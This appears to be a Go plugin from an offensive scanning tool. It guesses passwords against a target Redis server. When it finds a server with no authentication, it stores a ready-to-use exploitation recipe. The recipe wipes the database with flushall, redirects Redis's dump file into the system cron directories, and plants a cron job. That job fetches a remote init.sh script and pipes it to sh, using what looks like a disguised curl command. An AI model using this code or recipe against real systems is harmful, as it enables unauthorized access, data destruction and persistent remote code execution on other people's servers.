package plugins

import (
	"context"
	"github.com/go-redis/redis"
	"strings"
	"time"
)

func redisCheck(s *Service) {
	s.crack()
}

func redisConn(parent context.Context, s *Service, _, pass string) (ok int) {
	ok = OKNext
	client := redis.NewClient(&redis.Options{
		Addr:        s.parent.TargetIp + ":" + s.parent.TargetPort,
		Password:    pass,
		DB:          0,
		DialTimeout: time.Millisecond * time.Duration(Config.TimeOut),
	})
	defer client.Close()
	ctx, _ := context.WithCancel(parent)
	pong, err := client.Ping(ctx).Result()
	if err == nil {
		if strings.Contains(pong, "PONG") {
			ok = OKDone
		} else {
			ok = OKStop
		}
	} else {
		if strings.Contains(err.Error(), " without any password configured") {
			ok = OKNoAuth
			s.parent.Result.ExpHelp = `
config set stop-writes-on-bgsave-error no
flushall
config set dbfilename web
set 1 \n\n*/1 * * * * cdt -fsSL oxx/init.sh |sh\n\n
config set dir /var/spool/cron
save
config set dir /var/spool/cron/crontabs
save
config set dir /etc/cron.d
save
config set stop-writes-on-bgsave-error yes`
			return
		}
		//账号密码错误
		if strings.Contains(err.Error(), "username-password") ||
			strings.Contains(err.Error(), "OAUTH Authentication required") {
			return
		}
		if strings.Contains(err.Error(), "connection reset by peer") {
			//连接限制
			ok = OKWait
			return
		}
		if strings.Contains(err.Error(), "i/o timeout") {
			ok = OKTimeOut
			return
		}
		if strings.Contains(err.Error(), " protected mode") {
			//配置限制访问
			ok = OKForbidden
			return
		}
		ok = OKStop
	}
	return
}
